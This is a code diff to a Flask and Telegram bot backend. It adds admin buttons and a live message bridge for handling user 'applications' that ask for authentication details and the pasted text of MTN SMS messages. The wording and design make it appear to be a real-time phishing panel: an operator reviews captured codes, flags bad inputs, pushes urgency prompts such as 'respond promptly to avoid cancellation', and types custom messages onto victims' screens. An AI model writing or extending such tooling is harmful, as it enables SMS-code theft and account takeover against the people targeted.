@@ -30,10 +30,15 @@ def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step
         f"🆔 *Application ID:* `{app_data.get('app_id')}`"
     )
 
+    # Enhanced inline buttons for admin control over bad data or stalled users
     reply_markup = {
         "inline_keyboard": [
             [
                 {"text": f"✅ Approve {step_code.upper()}", "callback_data": f"approve_{step_code}_{db_id}"}
+            ],
+            [
+                {"text": "⚠️ Bad SMS / Data", "callback_data": f"badsms_{step_code}_{db_id}"},
+                {"text": "⏱️ Stalled User", "callback_data": f"stalled_{step_code}_{db_id}"}
             ],
             [
                 {"text": f"❌ Reject {step_code.upper()}", "callback_data": f"reject_{step_code}_{db_id}"},
@@ -59,6 +64,7 @@ def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step
 def telegram_webhook():
     data = request.get_json()
     
+    # Handle inline button clicks
     if "callback_query" in data:
         callback = data["callback_query"]
         callback_data = callback["data"]
@@ -89,19 +95,57 @@ def telegram_webhook():
             elif action == "reject":
                 applications_collection.update_one(
                     {"_id": ObjectId(db_id)},
-                    {"$set": {"status": "Rejected", "custom_message": "Invalid authentication details. Please try again."}}
+                    {"$set": {"status": "Rejected", "custom_message": "Verification failed. Please restart your application."}}
                 )
                 text_response = f"❌ {step_code.upper()} Rejected!"
+
+            elif action == "badsms":
+                # Handle garbage or incorrect paste inputs from users
+                applications_collection.update_one(
+                    {"_id": ObjectId(db_id)},
+                    {"$set": {"status": "BadInput", "custom_message": "Invalid SMS or data format submitted. Please copy the complete, unedited message from MTN."}}
+                )
+                text_response = "⚠️ Flagged bad input for user correction."
+
+            elif action == "stalled":
+                # Handle users lingering or stalling out
+                applications_collection.update_one(
+                    {"_id": ObjectId(db_id)},
+                    {"$set": {"status": "StalledPrompt", "custom_message": "Your session is waiting for authorization. Please respond promptly to avoid cancellation."}}
+                )
+                text_response = "⏱️ Sent stall reminder to user."
 
             elif action == "msg":
                 applications_collection.update_one(
                     {"_id": ObjectId(db_id)},
-                    {"$set": {"status": "CustomMessage", "custom_message": "Action Required: Please carefully check your authentication details and re-enter."}}
+                    {"$set": {"status": "CustomMessage", "custom_message": "Admin Note: Please review your entry and provide the correct information."}}
                 )
                 text_response = "💬 Prompt sent to user screen!"
 
             answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
             requests.post(answer_url, json={"callback_query_id": callback_id, "text": text_response})
+
+    # Handle direct text messages sent by admin in Telegram chat (Two-way custom reply bridge)
+    elif "message" in data:
+        msg = data["message"]
+        chat_id = str(msg.get("chat", {}).get("id"))
+        text = msg.get("text", "")
+        
+        # Check if message is from the admin chat ID
+        if chat_id == TELEGRAM_ADMIN_CHAT_ID:
+            # If the admin replies to a notification or types a custom message, find the latest active application
+            latest_app = applications_collection.find_one(sort=[("_id", -1)])
+            if latest_app:
+                applications_collection.update_one(
+                    {"_id": latest_app["_id"]},
+                    {"$set": {"custom_message": text, "status": "CustomMessage"}}
+                )
+                # Send confirmation back to admin chat
+                reply_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+                requests.post(reply_url, json={
+                    "chat_id": TELEGRAM_ADMIN_CHAT_ID,
+                    "text": f"📢 Pushed live to user screen:\n\"{text}\""
+                })
 
     return jsonify({"status": "ok"}), 200
 
